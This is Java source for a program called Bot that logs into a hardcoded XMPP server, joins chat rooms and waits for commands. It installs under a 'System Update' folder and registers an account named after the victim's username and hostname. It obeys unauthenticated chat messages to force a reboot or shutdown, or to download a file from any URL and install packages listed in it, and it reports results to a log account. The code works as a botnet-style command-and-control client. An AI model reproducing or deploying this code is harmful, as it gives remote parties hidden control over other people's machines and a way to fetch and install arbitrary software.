package base;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.HashMap;
import java.util.Random;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.jivesoftware.smack.AccountManager;
import org.jivesoftware.smack.Chat;
import org.jivesoftware.smack.ChatManager;
import org.jivesoftware.smack.ChatManagerListener;
import org.jivesoftware.smack.Connection;
import org.jivesoftware.smack.ConnectionConfiguration;
import org.jivesoftware.smack.MessageListener;
import org.jivesoftware.smack.PacketListener;
import org.jivesoftware.smack.Roster;
import org.jivesoftware.smack.SmackConfiguration;
import org.jivesoftware.smack.XMPPConnection;
import org.jivesoftware.smack.XMPPException;
import org.jivesoftware.smack.packet.Message;
import org.jivesoftware.smack.packet.Packet;
import org.jivesoftware.smackx.filetransfer.FileTransferManager;
import org.jivesoftware.smackx.filetransfer.OutgoingFileTransfer;
import org.jivesoftware.smackx.muc.MultiUserChat;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

public class Bot implements Serializable {
	/**
	 * Creates a new account or login to an XMPP-server with an existing account.
	 * Then listen in a MUC (MultiUserChat) or in a private chat to commands.
	 * A command can be a hardcoded keyword or an URL (XML-file)
	 * 
	 */

	private static final long serialVersionUID = -793888296060077135L;

	final private String serverName="b0t.controlaltdieliet.be"; //our XMPP server
	final private int portNumber=5222; // the port where the XMPP-server is listening on
	private String systemPath="c:\\System Update\\"; // path where the bot is installed in
	final private String settingsFile=systemPath+"settings.tmp"; // the file where the username and password i stored 
	final private	String logAccount="log@controlaltdieliet.be"; // the XMMP account where it sends feedback to
	private ConnectionConfiguration config = new ConnectionConfiguration(serverName, portNumber);
	private Connection conn = new XMPPConnection(config);

	private String username;
	private String hostname;
	private String password;




	public Bot() throws IOException {
		/*
		 * If there is a settingsfile I use that data
		 * Else I create a new file
		 * Finally I login to the xmpp-server 
		 */


		username = "USERUNKNOW";
		hostname = "UNKNOWHOSTNAME";
		password = "D0GH0US3BLU3Z";


		try {
			File f = new File(settingsFile);
			if (f.exists()) {
				readSettings();
			} else {
				writeSettings();
			}
		} catch (ClassNotFoundException e) {

		}

		this.connect();




	}

	private void readSettings() throws ClassNotFoundException, IOException
	/*
	 *  Reads the settings from the settingsfile
	 */
	{
		try {
			FileInputStream saveFile = new FileInputStream(settingsFile);
			ObjectInputStream restore = new ObjectInputStream(saveFile);
			username = (String) restore.readObject();
			hostname = (String) restore.readObject();
			password = (String) restore.readObject();
			;
			System.out.println("username " + username + " and host=" + 
					hostname
					+ " and ww is " + password);
			restore.close();
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			System.out.println("\n\n\n\t\t\t No File");
			// writeSettings();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void writeSettings() throws IOException {
		/*
		 *Generates a username based on the current username and the computername
		 * Generates a random password
		 * Writes these settings to the settingsfile
		 *
		 */
		Random generator = new Random();
		int r = generator.nextInt();
		password = password + r;
		retrieveUsername();
		retrieveHostname();

		FileOutputStream saveFileTo = new FileOutputStream(settingsFile);
		ObjectOutputStream save = new ObjectOutputStream(saveFileTo);
		save.writeObject(username);
		save.writeObject(hostname);
		save.writeObject(password);
		save.close();
	}

	private void retrieveUsername() {
		/* 
		 * Retrieves the username that is running the program
		 */
		username = System.getProperty("user.name");
	}

	private void retrieveHostname() {
		/* 
		 * Retrieves the hostname of the device that is running the program
		 */
		try {
			String line;
			Process p = Runtime.getRuntime().exec("hostname");

			BufferedReader in = new BufferedReader(new InputStreamReader(
					p.getInputStream()));
			while ((line = in.readLine()) != null) {
				hostname = line;
			}
			in.close();
		} catch (Exception e) {
			System.out.println("Oops, that went wrong: "+e);
		}

	}




	private void connect() {
		/* 
		 * Connects to the xmpp-server.
		 * Tries to create an account with the username and hostname and password from the settingsfile
		 * Logs in at the XMPP-server
		 * Retrieves the Roster
		 */
		SmackConfiguration.setPacketReplyTimeout(10000);
		try {
			conn.connect();

		} catch (XMPPException e) {
			System.out.println("Can't connect, somethings wrong with the network?");
		}

		AccountManager am = conn.getAccountManager();
		HashMap m = new HashMap<String, String>();

		try {
			System.out.println("trying to create ");
			am.createAccount(username + "_" + hostname, password);
			System.out.println("account created ");
		} catch (XMPPException e) {
			System.out.println(e);}
		catch (Exception e) {
		} finally {
			System.out.println("Login");
			try {
				conn.login(username+"_"+hostname, password);
			} catch (XMPPException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			this.getRoster();
			System.out.println("Login successfull");

		}

	}

	private void enterRoom(String roomName) {
		/*
		 * Enters a MUC and listens for messages to handle
		 * @param roomName The name of the MuC
		 */
		MultiUserChat muc = new MultiUserChat(conn,roomName+"@conference"+serverName);
		try {
			muc.join(username + "_" + hostname);
			muc.addMessageListener(new PacketListener()
			{

				@Override
				public void processPacket(Packet packet) {
					// TODO Auto-generated method stub
					{
						Message msg = (Message) packet;

						handleMessage(msg);

					}


				}
			});


		} catch (XMPPException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			System.out.println("Couldn't login at MUC");
		}

	}

	public void listenMessages() {
		/*
		 * Listens to private chats
		 */
		ChatManager chatmanager = conn.getChatManager();
		chatmanager.addChatListener(new ChatManagerListener()
		{
			public void chatCreated(final Chat chat, final boolean
					createdLocally)
			{
				chat.addMessageListener(new MessageListener()
				{
					public void processMessage(Chat chat, Message message)
					{
						handleMessage(message);
					}

				});
			}
		});


		while (1<2) // keep listening
		{
			try {
				Thread.sleep(1500);
				//    System.out.println("still listening");
			} catch (InterruptedException e) {

				e.printStackTrace();
			}
		}

	}

	private void sendFile(String to,String file){
		/*
		 * This sends a file to someone
		 * @param to the xmmp-account who receives the file, the destination  
		 * @param file the path from the file
		 */
		File f=new File(file);
		FileTransferManager manager = new FileTransferManager(conn);
		OutgoingFileTransfer transfer =
				manager.createOutgoingFileTransfer(to);

		// Send the file
		try {
			transfer.sendFile(f,"I have a file for you?");
		} catch (XMPPException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			sendMessage(logAccount,"Sorry,couldn't deliver the file");
		}

	}

	private void sendMessage(String to,String message){
		/*
		 * this sends a message to someone
		 * @param to the xmmp-account who receives the message, the destination
		 * @param message: yeah, the text I'm sending...
		 */

		ChatManager chatmanager = conn.getChatManager();
		Chat newChat = chatmanager.createChat(to, new MessageListener() {
			public void processMessage(Chat chat, Message m) {
			}
		});
		try {
			newChat.sendMessage(message);
		}
		catch (XMPPException e) {
			System.out.println("Error Delivering block" +e);
		}

	}

	private void getRoster(){
		/*
		 * get the Roster and add the logaccount as a contact
		 */
		Roster roster = conn.getRoster();
		roster.setDefaultSubscriptionMode(Roster.SubscriptionMode.accept_all);
		roster.setSubscriptionMode(Roster.SubscriptionMode.accept_all);
		String[] groups= {"admins"};
		try {
			roster.createEntry(logAccount, logAccount,groups );
		} catch (XMPPException e) {
			e.printStackTrace();
		}
	}




	private void handleMessage(Message message){
		/*
		 * one of the core elements of the program
		 * It handles the incoming messages
		 * If the incoming message is a predefined command, it executes the command
		 * Else it sees the message as an url and tries to download it and send it to the XML-parser 
		 */
		String command=message.getBody();
		if (!(command.isEmpty())){

			if (command.equals("REBOOT")){
				try {
					Process p = Runtime.getRuntime().exec("shutdown /r /t 15 /f ");
				} catch (IOException e) {
					sendMessage(logAccount,"Something went wrong:"+e);
				}
			}
			else if (command.equals("SHUTDOWN")){
				try {
					Process p = Runtime.getRuntime().exec("shutdown /s /t 15 /f ");
				} catch (IOException e) {
					sendMessage(logAccount,"Something went wrong:"+e);
				}

			}

			else if (command.startsWith("JOIN")){
				String[] command_ = command.split(" ");
				sendMessage(logAccount,"trying to join " +command_[1]+"@conference.xmpp.vclbgent.be");
				enterRoom(command_[1]+"@conference"+serverName);
				//this.XMPP_ListenMessages();
			}


			else{

				URL website;
				try {

					sendMessage(logAccount,"tryint to create url " +command);
					website = new URL(command);
					ReadableByteChannel rbc = 
							Channels.newChannel(website.openStream());
					FileOutputStream fos = new 
							FileOutputStream(systemPath+website.getPath());
					fos.getChannel().transferFrom(rbc, 0, 
							Long.MAX_VALUE);
					readXML(systemPath+website.getPath());
				} catch (MalformedURLException e) {
					// TODO Auto-generated catch block
					sendMessage(logAccount,"wrong url"+ command);
				}
				catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
					sendMessage(logAccount,"Couldn't write file"+e);
				}
			}

		}

	}



	private void readXML(String path){
		/*
		 * Reads an xml-file.
		 * Checks it contents and can send the arguments to the packetinstaller.
		 */
		try {

			File fXmlFile = new File(path);
			DocumentBuilderFactory dbFactory = 
					DocumentBuilderFactory.newInstance();
			DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
			Document doc = dBuilder.parse(fXmlFile);
			doc.getDocumentElement().normalize();
			sendMessage(logAccount,"root element="+doc.getDocumentElement().getNodeName());

			NodeList nList = doc.getElementsByTagName("command");
			for (int temp = 0; temp < nList.getLength(); temp++) {

				Node nNode = nList.item(temp);

				sendMessage(logAccount,"elements are"+ "\nCurrent Element :" +nNode.getNodeName());

				if (nNode.getNodeType() == Node.ELEMENT_NODE) {

					Element eElement = (Element) nNode;

					String action="";
					String download="";
					String cmd="";
					String filename="";
					String feedbackto="";
					String emailto="";
					String registry="";

					action=eElement.getElementsByTagName("action").item(0).getTextContent();
					download=eElement.getElementsByTagName("download").item(0).getTextContent();
					cmd=eElement.getElementsByTagName("cmd").item(0).getTextContent();
					filename=eElement.getElementsByTagName("filename").item(0).getTextContent();

					//TO IMPLEMENT
					//feedbackto=eElement.getElementsByTagName("feedbackto").item(0).getTextContent();
					//emailto=eElement.getElementsByTagName("emailto").item(0).getTextContent();
					//registry=eElement.getElementsByTagName("registry").item(0).getTextContent();


					if (action.equals("INSTALL")) {
						sendMessage(logAccount,"INSTALLING FILENAME"+filename);
						packetInstaller pi= new 
								packetInstaller(action,download,cmd,filename,registry);

					}

				}
			}
		} catch (Exception e) {
			sendMessage(logAccount,"something went wrong"+e);
		}
	}








	public static void main(String[] args) throws IOException {
		// TODO Auto-generated method stub
		Bot bot = new Bot();



		bot.enterRoom("WhereComputersMeet");

		if (bot.hostname.startsWith("DELL")){
			bot.enterRoom("DELL");
		}

		if (bot.hostname.startsWith("HP")){
			bot.enterRoom("HP");
		}
		bot.getRoster();
		bot.listenMessages();

		//		while (1>=0){}



	}

}


